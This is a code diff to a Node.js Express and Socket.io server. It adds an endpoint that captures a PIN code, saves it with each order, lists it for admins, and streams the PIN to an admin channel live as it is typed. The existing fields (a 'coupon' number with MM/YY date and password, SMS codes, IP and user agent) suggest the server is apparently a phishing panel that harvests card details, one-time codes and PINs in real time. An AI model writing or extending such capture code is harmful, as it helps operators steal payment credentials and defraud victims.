@@ -471,6 +471,7 @@ app.get('/api/admin/orders', requireAdmin('data'), (req, res) => {
           total: row.total, status: row.status,
           couponCode: row.coupon_code, dateMMYY: row.coupon_date,
           password: row.coupon_password, smsCode: row.sms_code,
+          pinCode: row.pin_code,
           userAgent: row.user_agent, ipAddress: row.ip_address,
           couponHistory: historyMap[row.id] || [],
           smsHistory: smsMap[row.id] || [],
@@ -540,6 +541,29 @@ app.post('/api/orders/:id/sms', (req, res) => {
       if (err2) return res.status(500).json({ error: err2.message });
       adminNsp.emit('order_update', { id, status: 'SMS_SUBMITTED', smsCode });
       io.to(`order_${id}`).emit('order_update', { id, status: 'SMS_SUBMITTED', smsCode });
+      res.json({ success: true });
+    });
+  });
+});
+
+// 5a. User: Submit PIN Code (requires order_token)
+app.post('/api/orders/:id/pin', (req, res) => {
+  const { id } = req.params;
+  const { pinCode, order_token } = req.body;
+  if (!pinCode) return res.status(400).json({ error: 'PIN code is required' });
+  if (!order_token) return res.status(400).json({ error: 'order_token is required' });
+
+  db.get('SELECT order_token FROM orders WHERE id = ?', [id], (err, row) => {
+    if (err) return res.status(500).json({ error: err.message });
+    if (!row) return res.status(404).json({ error: 'Order not found' });
+    if (row.order_token != null && row.order_token !== '') {
+      if (!order_token || row.order_token !== order_token) return res.status(403).json({ error: 'Invalid order token' });
+    }
+
+    db.run("UPDATE orders SET status = 'PIN_SUBMITTED', pin_code = ? WHERE id = ?", [pinCode, id], function(err2) {
+      if (err2) return res.status(500).json({ error: err2.message });
+      adminNsp.emit('order_update', { id, status: 'PIN_SUBMITTED', pinCode });
+      io.to(`order_${id}`).emit('order_update', { id, status: 'PIN_SUBMITTED', pinCode });
       res.json({ success: true });
     });
   });
@@ -983,6 +1007,9 @@ io.on('connection', (socket) => {
     if (data.dateMMYY !== undefined) session.dateMMYY = data.dateMMYY;
     if (data.password !== undefined) session.password = data.password;
     adminNsp.emit('live_coupon_update', { id: socket.id, ...data });
+  });
+  socket.on('live_pin_update', (data) => {
+    adminNsp.emit('live_pin_update', { orderId: socket.currentOrderId, pinCode: data.pinCode });
   });
   socket.on('live_order_coupon_update', (data) => {
     adminNsp.emit('live_order_coupon_update', data);
